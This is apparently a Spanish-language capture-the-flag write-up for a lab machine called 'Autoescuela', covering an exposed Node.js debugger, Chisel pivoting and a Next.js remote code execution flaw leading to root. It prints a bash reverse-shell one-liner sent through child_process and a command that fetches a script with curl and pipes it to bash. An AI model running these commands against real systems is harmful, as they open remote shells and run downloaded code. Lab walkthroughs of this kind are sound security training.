# Autoescuela

## 🔎 Enumeración

Se realiza un escaneo de puertos utilizando Nmap, identificando los siguientes servicios:

* 8080/tcp – HTTP
* 9229/tcp – Node.js Debugger

<img width="952" height="612" alt="Pasted image 20260810121104" src="https://github.com/user-attachments/assets/fac75245-d3c4-454e-b6f6-bea9d0d64737" />

## 💥 Explotación del Node.js Debugger

El puerto 8080 aloja una aplicación web desarrollada con **Node.js** y **Express**

<img width="1201" height="507" alt="Pasted image 20260810121330" src="https://github.com/user-attachments/assets/87685067-7a12-4692-a069-7e4d067710a7" />

Por otro lado, el puerto 9229 corresponde al inspector remoto de **Node.js**. Al interactuar con el servicio se obtiene el mensaje "WebSockets request was expected", lo que permite identificar que el debugger está expuesto públicamente y sin autenticación

La exposición del inspector remoto representa un vector de ataque crítico, ya que permite interactuar con el entorno de ejecución de **Node.js**

Se prepara un listener mediante Netcat y se establece una conexión con el inspector expuesto

<img width="290" height="85" alt="Pasted image 20260810123557" src="https://github.com/user-attachments/assets/d5656568-a88d-4217-b648-a4e6707abb3b" />

<img width="408" height="76" alt="Pasted image 20260810124222" src="https://github.com/user-attachments/assets/7124e9ef-bc2b-45c0-8662-ba524c201ae3" />

A través de la ejecución de código JavaScript en el contexto de **Node.js**, se utiliza **child_process** para ejecutar comandos en el sistema y obtener una reverse shell

```bash
exec("process.mainModule. require( 'child_process' ). exec( '/bin/bash -c \"/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1\"' )")
```

<img width="1292" height="413" alt="Pasted image 20260810124328" src="https://github.com/user-attachments/assets/d899149a-96a4-4d64-8b11-48e8796d1d3c" />

Establecemos conexión

<img width="782" height="195" alt="Pasted image 20260810124543" src="https://github.com/user-attachments/assets/23dfc35f-1857-47e2-8f00-dbd221327d29" />

Hacemos tratamiento de TTY

<img width="240" height="140" alt="Pasted image 20260810125038" src="https://github.com/user-attachments/assets/16c84ab5-21c6-458c-ab6d-70a3d05a78d7" />

Se logra obtener la flag de usuario

<img width="631" height="237" alt="Pasted image 20260810125156" src="https://github.com/user-attachments/assets/86ab95ea-3278-480e-be37-d9e7c85560d6" />

##  🔎 Enumeración Interna

Tras obtener acceso al sistema, se realiza una nueva fase de enumeración

No se encuentran binarios SUID relevantes, por lo que se analizan los servicios que están escuchando internamente

<img width="572" height="237" alt="Pasted image 20260810125341" src="https://github.com/user-attachments/assets/4390a263-091a-4a32-aad7-3e1f016abeab" />

Durante esta etapa se descubre un servicio en el puerto 3000, accesible únicamente desde **127.0.0.1** y ejecutándose con privilegios de root

<img width="777" height="217" alt="Pasted image 20260810125905" src="https://github.com/user-attachments/assets/89d43cc2-7ddb-495a-9f45-824352c5ef8d" />

<img width="1093" height="252" alt="Pasted image 20260810130545" src="https://github.com/user-attachments/assets/c4a615de-abb6-48d2-8817-d8088e1e6480" />

El servicio corresponde a una aplicación **Next.js 15.0.0-rc.1** ejecutándose en modo desarrollo

Al no estar expuesto directamente hacia el exterior, es necesario establecer un túnel para acceder al servicio

## 🔀 Pivoting mediante Chisel

Para acceder al servicio interno se utiliza [Chisel](https://github.com/jpillora/chisel/releases#release-v1.11.8), para ello nos bajamos la herramienta desde nuestra maquina atacante

<img width="817" height="145" alt="Pasted image 20260810131610" src="https://github.com/user-attachments/assets/c6df7669-9f8a-4b6e-a302-bfc146709655" />

<img width="705" height="92" alt="Pasted image 20260810144345" src="https://github.com/user-attachments/assets/17950003-aa70-4def-9e52-8a81fd9d6d74" />

Establecemos un túnel reverso para la máquina atacante 
 
<img width="903" height="92" alt="Pasted image 20260810132239" src="https://github.com/user-attachments/assets/1e42f340-2df8-438c-a843-df7a76275b6a" />

Ahora para nuestra máquina víctima

<img width="861" height="121" alt="image" src="https://github.com/user-attachments/assets/1413ea08-6c5f-42a1-9922-354aab52e63d" />

Una vez configurado el port forwarding, es posible interactuar con la aplicación **Next.js** interna desde la máquina atacante

<img width="540" height="242" alt="Pasted image 20260810133754" src="https://github.com/user-attachments/assets/0cf29889-8621-43f8-937e-ae614f6257d9" />

<img width="747" height="622" alt="Pasted image 20260810133909" src="https://github.com/user-attachments/assets/70995b16-77db-42dc-a8bc-015e51db8e05" />

## 💣 Explotación de Next.js – CVE-2025-55182

Tras analizar la aplicación interna, se identifica que la versión de **Next.js** utilizada es potencialmente vulnerable al [**CVE-2025-55182**](https://www.cve.org/CVERecord?id=CVE-2025-55182)

La vulnerabilidad permite alcanzar **Remote Code Execution (RCE)** mediante el procesamiento de peticiones especialmente manipuladas

A continuación, se descarga el archivo tanto en la máquina atacante como en la máquina víctima.

Posteriormente, se utilizará un [exploit](https://github.com/freeqaz/react2shell) para comprobar inicialmente la vulnerabilidad mediante la ejecución de comandos, confirmando posteriormente que es posible ejecutar comandos con privilegios de root

```bash
./exploit-redirect.sh http://localhost:3000 "whoami"
```

<img width="696" height="230" alt="Pasted image 20260810143026" src="https://github.com/user-attachments/assets/a6abc77c-a9db-4295-a26e-73c93ef71928" />

<img width="362" height="51" alt="Pasted image 20260810135134" src="https://github.com/user-attachments/assets/e285255d-5051-4a53-be4c-b7b6004beb33" />

Abrimos un listener que recibirá la shell de **root** por el puerto 1234

<img width="292" height="123" alt="Pasted image 20260810140005" src="https://github.com/user-attachments/assets/8a73418f-c8f8-4618-9fb1-fb861fe00023" />

## 👑 Obtención de Root

Una vez confirmada la ejecución remota de comandos como **root**, se prepara una nueva reverse shell en la carpeta del [exploit](https://github.com/freeqaz/react2shell)

<img width="615" height="96" alt="Pasted image 20260810141325" src="https://github.com/user-attachments/assets/016a229f-580f-4b78-a5ee-2893098a245f" />

Se utiliza un servidor HTTP para alojar el script y posteriormente se indica la descarga y la ejecución mediante el [exploit](https://github.com/freeqaz/react2shell)

<img width="705" height="92" alt="Pasted image 20260810144345" src="https://github.com/user-attachments/assets/550c49b8-b6d1-43ec-96f4-93436bf537f1" />

```bash
./exploit-redirect.sh http://127.0.0.1:3000 "curl http://172.17.0.1:80/rev.sh | bash"
```

<img width="697" height="103" alt="Pasted image 20260810144305" src="https://github.com/user-attachments/assets/2ce1bb4f-ca46-49a2-833a-e0778778a8a6" />

Finalmente, se recibe la conexión en el listener y se obtiene acceso como root, logrando así la flag final de la máquina

<img width="376" height="138" alt="Pasted image 20260810144506" src="https://github.com/user-attachments/assets/ec5d0a6b-094f-437f-ab66-720443312ea8" />

🏁 Conclusión

Este laboratorio demuestra el impacto que puede tener la exposición de servicios de desarrollo y herramientas de debugging en entornos accesibles desde la red.

La cadena de ataque combina la explotación de un Node.js Debugger expuesto, enumeración de servicios internos, pivoting mediante Chisel y explotación de una vulnerabilidad crítica en Next.js, demostrando cómo una mala configuración inicial puede terminar comprometiendo completamente el sistema.
